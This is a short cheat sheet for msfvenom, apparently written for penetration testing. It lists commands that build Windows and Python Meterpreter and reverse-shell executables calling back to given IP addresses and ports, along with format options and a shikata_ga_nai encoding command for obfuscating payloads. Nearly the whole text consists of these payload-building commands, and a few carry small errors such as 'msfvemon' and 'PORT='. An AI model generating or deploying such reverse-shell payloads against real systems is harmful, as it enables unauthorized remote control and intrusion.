# Msfvenom

> ## **Syntax**

    msfvenom -p [payload] LHOST=[MyIP] LPORT=[DesiredPort] -f [Format] -o [YourMalwareFile]

`Example for a Windows Machine`

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=1234 -f exe -o MyFile.exe

`Example for a Linux Machine`

    msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=1234 -f raw -o MyFile.exe


`Format Help`

    msfvemon --help-formats

------

> ## **Payloads**

`List of payloads`

    -l payloads

`Format`

    $ msfvenom –p [ExploitPath] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort] –f [FormatType]

`Example`

Reverse Meterpreter payload as an executable and redirected into a file:

    $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1  PORT=4444 –f exe > met.exe

Reverse TCP payload as an EXE creating the Wise.exe program

    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.131 LPORT=7777 -f exe -o Wise.exe

` Format Options (specified with –f)` 

| **Option** | **Description** |
|------------|-----------------|
|`--help-formats` | Print out a summary of the specified options |
|`exe` | Executable |
| `pl` | Perl |
| `rb` | Ruby |
| `raw` | Raw shellcode |
| `c` | C code |

------

> ## **Encoders**

`List of encoders`

    -l encoders

    $ msfvenom –p [Payload] -e [Encoder] -f [FormatType (exe, perl, ruby, raw, c)] -i [EncodeInterations] -o [OutputFilename]

`Example`

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

    $ msfvenom –p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe -o mal.exe